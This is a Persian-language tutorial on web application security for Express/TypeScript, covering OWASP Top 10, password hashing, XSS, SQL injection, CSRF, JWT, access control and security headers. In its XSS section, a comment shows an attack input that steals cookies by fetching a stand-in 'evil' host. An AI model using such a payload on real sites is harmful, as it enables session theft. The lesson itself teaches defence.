# امنیت برنامه‌های وب

> مراجع: [OWASP Top 10](https://owasp.org/www-project-top-ten/) · [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/) · [Express Security](https://expressjs.com/en/advanced/best-practice-security.html)

امنیت یک قابلیت نیست؛ یک عادت در هر خط کد است. این درس پرتکرارترین اشتباهاتی را که واقعاً منجر به نشت داده می‌شوند پوشش می‌دهد.

## ۱. OWASP Top 10 — نقشه‌ی راه

| # | دسته | نمونه در عمل |
| --- | --- | --- |
| A01 | Broken Access Control | کاربر A با تغییر `id` در URL داده‌ی کاربر B را می‌بیند |
| A02 | Cryptographic Failures | ذخیره‌ی رمز با MD5 یا ارسال روی HTTP |
| A03 | Injection | `"SELECT * FROM users WHERE name='" + input + "'"` |
| A04 | Insecure Design | نبود rate limit روی ورود، نبود تأیید مالکیت |
| A05 | Security Misconfiguration | `NODE_ENV=production` نبودن، CORS باز، stack trace عمومی |
| A06 | Vulnerable Components | پکیج قدیمی با CVE شناخته‌شده |
| A07 | Auth Failures | JWT بدون انقضا، نبود قفل پس از تلاش‌های ناموفق |
| A08 | Integrity Failures | نصب پکیج ناشناس، deserialize داده‌ی غیرقابل اعتماد |
| A09 | Logging Failures | لاگ نکردن رویدادهای امنیتی |
| A10 | SSRF | fetch کردن URLی که کاربر می‌دهد بدون allowlist |

## ۲. هش رمز عبور

```ts
import argon2 from 'argon2'

export const hashPassword = (plain: string) => argon2.hash(plain, { type: argon2.argon2id })
export const verifyPassword = (hash: string, plain: string) => argon2.verify(hash, plain)
```

قواعد:

- **هرگز** رمز را با SHA-256/MD5 هش نکنید؛ برای رمز باید الگوریتم کند و نمک‌دار (argon2id/bcrypt/scrypt) استفاده شود.
- طول رمز از ۸ کاراکتر و بدون محدودیت حداکثر مضحک (حداقل ۶۴ کاراکتر مجاز).
- رمز را هرگز لاگ نکنید.
- برای بازیابی رمز، توکن یک‌بارمصرف با انقضای کوتاه بفرستید — نه رمز فعلی.

## ۳. XSS — اجرای اسکریپت در مرورگر کاربر

```ts
// ❌ خطرناک: HTML خام
res.send(`<p>سلام ${req.query.name}</p>`)
// با name = <img src=x onerror="fetch('//evil/'+document.cookie)"> کوکی دزدیده می‌شود

// ✅ escape
import escapeHtml from 'escape-html'
res.send(`<p>سلام ${escapeHtml(String(req.query.name))}</p>`)
```

در React:

```tsx
<p>{userInput}</p>                     // ✅ به‌صورت متن رندر می‌شود
<p dangerouslySetInnerHTML={{ __html: userInput }} />   // ❌ فقط با sanitize
```

اگر HTML غنی لازم دارید: `DOMPurify` (کلاینت) یا `sanitize-html` (سرور) — بدون استثنا.

**CSP** به‌عنوان لایه‌ی دوم:

```ts
app.use((_req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; img-src 'self' data: https:; script-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'"
  )
  next()
})
```

## ۴. SQL Injection

```ts
// ❌
await db.query(`SELECT * FROM users WHERE email = '${email}'`)

// ✅ پارامتر
await db.query('SELECT * FROM users WHERE email = $1', [email])

// ✅ ORM
await prisma.user.findUnique({ where: { email } })
```

ORM به‌تنهایی کافی نیست: `$queryRawUnsafe` و مرتب‌سازی بر اساس نام ستون ورودی کاربر راه‌های دور زدن هستند:

```ts
const sortable = new Set(['createdAt', 'title', 'price'])
const orderBy = sortable.has(String(req.query.sort)) ? String(req.query.sort) : 'createdAt'
```

## ۵. CSRF

حمله: سایت مخرب فرمی به سایت شما ارسال می‌کند و مرورگر کوکی کاربر را می‌فرستد.

اولین خط دفاع: کوکی `sameSite`.

```ts
res.cookie('session', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',          // 'strict' برای عملیات حساس
  path: '/',
  maxAge: 1000 * 60 * 60 * 24
})
```

برای فرم‌های حساس، توکن CSRF یا بررسی هدر `Origin` هم اضافه کنید. اگر از توکن Bearer در هدر `Authorization` استفاده می‌کنید، CSRF عملاً منتفی است — اما XSS خطرناک‌تر می‌شود.

## ۶. احراز هویت با JWT

```ts
import jwt from 'jsonwebtoken'

const accessToken = jwt.sign({ sub: user.id, role: user.role }, process.env.JWT_SECRET!, {
  expiresIn: '15m',
  issuer: 'acme-api',
  audience: 'acme-web'
})
```

```ts
// verify middleware
import type { RequestHandler } from 'express'

export const requireAuth: RequestHandler = (req, res, next) => {
  const token = req.cookies?.session ?? req.header('authorization')?.replace('Bearer ', '')
  if (!token) return res.status(401).json({ error: 'احراز هویت لازم است' })

  try {
    const payload = jwt.verify(token, process.env.JWT_SECRET!, {
      issuer: 'acme-api',
      audience: 'acme-web'
    }) as { sub: string; role: string }
    req.user = { id: payload.sub, role: payload.role }
    next()
  } catch {
    return res.status(401).json({ error: 'توکن نامعتبر یا منقضی' })
  }
}
```

اصول:

- Access token کوتاه‌مدت (۱۰–۱۵ دقیقه) + refresh token بلندمدت در کوکی httpOnly.
- `JWT_SECRET` را از env بگیرید و در production برچسب random حداقل ۳۲ بایت.
- هیچ‌وقت ادعاهای امنیتی (role) را از سمت کلاینت باور نکنید؛ از توکن امضاشده بخوانید و برای عملیات حساس، مالکیت منبع را هم بررسی کنید.

## ۷. Broken Access Control

```ts
// ❌ کاربر می‌تواند id هر کسی را بفرستد
app.get('/orders/:id', async (req, res) => {
  res.json(await db.order.findUnique({ where: { id: req.params.id } }))
})

// ✅ مالکیت بررسی می‌شود
app.get('/orders/:id', async (req, res) => {
  const order = await db.order.findUnique({ where: { id: req.params.id } })
  if (!order) return res.status(404).json({ error: 'یافت نشد' })
  if (order.userId !== req.user!.id) return res.status(403).json({ error: 'دسترسی ندارید' })
  res.json(order)
})
```

همیشه برای **هر** رکورد مالکیت را بررسی کنید؛ «url مخفی» محافظت نیست.

## ۸. Rate limiting و آبشاری از حملات

```ts
import rateLimit from 'express-rate-limit'

app.use('/api/auth/login', rateLimit({
  windowMs: 10 * 60 * 1000,
  limit: 10,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'تلاش‌های زیاد. لطفاً بعداً امتحان کنید.' }
}))
```

برای جلوگیری از شمارش کاربران (enumeration) هم پیام یکسان بدهید و هم زمان پاسخ یکسان نگه دارید.

## ۹. هدرهای امنیتی

```ts
import helmet from 'helmet'
app.use(helmet())

app.use((_req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff')
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(self)')
  next()
})
```

CORS را محدود کنید:

```ts
app.use(cors({
  origin: (origin, cb) => {
    const allowed = (process.env.CORS_ORIGIN ?? '').split(',').filter(Boolean)
    if (!origin || allowed.includes(origin)) return cb(null, true)
    cb(new Error('Origin غیرمجاز'))
  },
  credentials: true
}))
```

## ۱۰. رازها

- ‎.env در ‎.gitignore؛ فقط ‎.env.example را commit کنید.
- در production از secret manager (Vault، AWS Secrets Manager، GitHub Actions secrets) استفاده کنید.
- اگر راز لو رفت: **باطل کنید**، تاریخچه را پاک کنید، و همه‌ی محیط‌ها را بررسی کنید.
- کلیدهای API سرویس‌های پولی فقط سمت سرور؛ هرگز در باندل فرانت.

## ۱۱. لاگ رویدادهای امنیتی

```ts
logger.info({
  event: 'login_failed',
  ip: req.ip,
  userAgent: req.header('user-agent'),
  emailHash: sha256(email).slice(0, 12)   // هش، نه ایمیل خام
})
```

لاگ نکنید: رمز، توکن کامل، شماره کارت، داده‌ی شخصی حساس.

## چک‌لیست قبل از انتشار

- [ ] رمز با argon2/bcrypt
- [ ] کوکی/توکن httpOnly+secure یا همان‌سایت
- [ ] rate limit روی مسیرهای حساس
- [ ] helmet + CSP + CORS محدود
- [ ] escape خروجی HTML
- [ ] بررسی مالکیت منابع
- [ ] رازها فقط env/secret
- [ ] وابستگی‌ها به‌روز (`npm audit`)
- [ ] پیام‌های خطا بدون افشای جزئیات

## تمرین این درس

سرویس احراز هویت امن: ثبت‌نام/ورود/خروج با argon2، JWT کوتاه‌مدت در کوکی httpOnly، rate limit، helmet، CORS محدود، اعتبارسنجی و پیام یکسان برای جلوگیری از enumeration. جزئیات در تب تمرین است.
